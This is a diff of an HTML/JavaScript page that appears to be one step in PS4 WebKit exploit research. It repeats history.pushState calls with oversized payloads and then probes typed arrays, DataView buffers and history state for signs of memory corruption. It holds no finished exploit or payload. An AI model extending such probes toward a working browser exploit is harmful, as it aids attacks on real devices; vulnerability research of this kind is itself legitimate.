@@ -2,38 +2,36 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – Passo 8 (A/B/C)</title>
+<title>PS4 WebKit – Passo 8 Verbose</title>
 <style>
-  body { font-family: monospace; background:#000; color:#0f0; }
-  button { margin:6px; padding:6px 10px; }
-  pre { white-space: pre-wrap; }
+body { font-family: monospace; background:#000; color:#0f0; }
+button { margin:6px; padding:6px 12px; }
+pre { white-space: pre-wrap; }
 </style>
 </head>
 <body>
 
-<h2>PS4 WebKit – Passo 8: Observabilidade Pós-Corrupção</h2>
-<p>
-Base: <b>history.pushState + replaceState + back</b><br>
-Boundary conhecido: <b>977 + 14461</b><br>
-Execução segura: <b>49 iterações</b>
-</p>
+<h2>PS4 WebKit – Passo 8 (Verbose Instrumentation)</h2>
 
-<button onclick="runA()">Caminho A — Length Confusion</button>
-<button onclick="runB()">Caminho B — Pointer Drift (DataView)</button>
-<button onclick="runC()">Caminho C — History Reuse Inconsistente</button>
+<button onclick="runA()">[A] Length Confusion (Verbose)</button>
+<button onclick="runB()">[B] Pointer Drift (Verbose)</button>
+<button onclick="runC()">[C] History Reuse (Verbose)</button>
 
 <pre id="log"></pre>
 
 <script>
-const logEl = document.getElementById('log');
+const logEl = document.getElementById("log");
 function log(m){ logEl.textContent += m + "\n"; }
 function clearLog(){ logEl.textContent = ""; }
 
-// ====== Sequência Base (49 iterações, sem crash) ======
+// ===============================
+// BASE SEQUENCE – conhecida
+// ===============================
 function baseHistorySequence(iterations=49){
   let size = 977;
   for(let i=0;i<iterations;i++){
     const payload = "A".repeat(size);
+    log(`[BASE] ITER ${i} size=${size}`);
     history.pushState({i}, "", "#"+payload);
     history.replaceState({i, r:true}, "", "#"+payload.slice(0, payload.length>>1));
     if(i % 5 === 0) setTimeout(()=>history.back(), 0);
@@ -41,116 +39,128 @@ function baseHistorySequence(iterations=49){
   }
 }
 
-// =====================================================
-// Caminho A — Length Confusion
-// Objetivo: detectar alteração impossível de length/capacity
-// =====================================================
+// ===============================
+// A — LENGTH CONFUSION (VERBOSE)
+// ===============================
 function runA(){
   clearLog();
-  log("[A] Iniciando Caminho A — Length Confusion");
+  log("[A] === Length Confusion Test (Verbose) ===");
+
   try{
     baseHistorySequence(49);
 
-    // Alocação controlada pós-sequência
     const buf = new ArrayBuffer(0x100);
     const u8  = new Uint8Array(buf);
 
-    const expected = u8.length;
-    // Escritas válidas
-    for(let i=0;i<u8.length;i++) u8[i]=0x41;
+    log(`[A] Allocated Uint8Array @ length=${u8.length}`);
 
-    // Observações
-    log("[A] length esperado = " + expected);
-    log("[A] length observado = " + u8.length);
+    // Preenchimento conhecido
+    for(let i=0;i<u8.length;i++) u8[i] = i & 0xff;
 
-    // Leitura fora do padrão lógico (não deve mudar)
-    let anomaly = false;
-    try{
-      // acesso de verificação (não OOB explícito)
-      const probe = u8[u8.length-1];
-      if(probe !== 0x41) anomaly = true;
-    }catch(e){
-      anomaly = true;
+    // Snapshot inicial
+    let fingerprint1 = 0;
+    for(let i=0;i<u8.length;i++) fingerprint1 ^= u8[i];
+
+    log(`[A] Fingerprint BEFORE = 0x${fingerprint1.toString(16)}`);
+
+    // Acesso redundante
+    for(let round=0; round<5; round++){
+      let localXor = 0;
+      for(let i=0;i<u8.length;i++) localXor ^= u8[i];
+      log(`[A] Round ${round} XOR = 0x${localXor.toString(16)}`);
     }
 
-    log("[A] Anomalia detectada? " + anomaly);
-    log("[A] Finalizado");
+    // Snapshot final
+    let fingerprint2 = 0;
+    for(let i=0;i<u8.length;i++) fingerprint2 ^= u8[i];
+
+    log(`[A] Fingerprint AFTER  = 0x${fingerprint2.toString(16)}`);
+    log(`[A] Length esperado   = 256`);
+    log(`[A] Length observado  = ${u8.length}`);
+    log(`[A] Fingerprint mudou? ${fingerprint1 !== fingerprint2}`);
+
+    log("[A] === END ===");
   }catch(e){
     log("[A] Exception: " + e);
   }
 }
 
-// =====================================================
-// Caminho B — Pointer Drift (DataView)
-// Objetivo: detectar leitura incoerente/deriva lógica
-// =====================================================
+// ===============================
+// B — POINTER DRIFT (VERBOSE)
+// ===============================
 function runB(){
   clearLog();
-  log("[B] Iniciando Caminho B — Pointer Drift");
+  log("[B] === Pointer Drift Test (Verbose) ===");
+
   try{
     baseHistorySequence(49);
 
     const buf = new ArrayBuffer(0x80);
     const dv  = new DataView(buf);
 
-    // Inicialização conhecida
-    for(let i=0;i<0x80;i+=4) dv.setUint32(i, 0x41414141, true);
+    for(let i=0;i<0x80;i+=4)
+      dv.setUint32(i, 0x41414141, true);
 
-    // Leitura coerente esperada
-    let incoherent = false;
-    for(let i=0;i<0x80;i+=4){
-      const v = dv.getUint32(i, true);
-      if(v !== 0x41414141){
-        incoherent = true;
-        log("[B] Drift em offset " + i + ": 0x" + v.toString(16));
-        break;
+    log("[B] Buffer initialized with 0x41414141");
+
+    for(let pass=0; pass<6; pass++){
+      let drift = false;
+      log(`[B] Pass ${pass}`);
+      for(let i=0;i<0x80;i+=4){
+        const v = dv.getUint32(i, true);
+        if(v !== 0x41414141){
+          log(`[B] DRIFT at offset ${i}: 0x${v.toString(16)}`);
+          drift = true;
+          break;
+        }
       }
+      log(`[B] Drift detected this pass? ${drift}`);
     }
 
-    log("[B] Incoerência detectada? " + incoherent);
-    log("[B] Finalizado");
+    log("[B] === END ===");
   }catch(e){
     log("[B] Exception: " + e);
   }
 }
 
-// =====================================================
-// Caminho C — History Reuse Inconsistente
-// Objetivo: verificar estado reaproveitado com valores impossíveis
-// =====================================================
+// ===============================
+// C — HISTORY REUSE (VERBOSE)
+// ===============================
 function runC(){
   clearLog();
-  log("[C] Iniciando Caminho C — History Reuse");
+  log("[C] === History Reuse Test (Verbose) ===");
+
   try{
     baseHistorySequence(49);
 
-    // Inserir estado sentinela
-    history.pushState({sentinel:0x1337}, "", "#SENTINEL");
+    const marker = Math.floor(Math.random()*0xffffffff);
+    log(`[C] Sentinel marker = 0x${marker.toString(16)}`);
+
+    history.pushState({sentinel:marker}, "", "#SENTINEL");
     history.back();
 
-    // Aguardar navegação
     setTimeout(()=>{
       const st = history.state;
-      let inconsistent = false;
+      log("[C] history.state dump:");
+      log(JSON.stringify(st));
 
       if(st && typeof st === "object"){
-        // Valor impossível indica reuse/corrupção
-        if(st.sentinel !== undefined && st.sentinel !== 0x1337){
-          inconsistent = true;
-        }
+        log(`[C] sentinel present? ${"sentinel" in st}`);
+        log(`[C] sentinel value  = ${st.sentinel}`);
+        log(`[C] sentinel match? ${st.sentinel === marker}`);
+      } else {
+        log("[C] state is null or non-object");
       }
 
-      log("[C] history.state = " + JSON.stringify(st));
-      log("[C] Inconsistência detectada? " + inconsistent);
-      log("[C] Finalizado");
-    }, 50);
+      log("[C] === END ===");
+    }, 80);
 
   }catch(e){
     log("[C] Exception: " + e);
   }
 }
 
-log("Pronto. Selecione um caminho.");
+log("Ready. Choose a test.");
 </script>
 </body>
 </html>
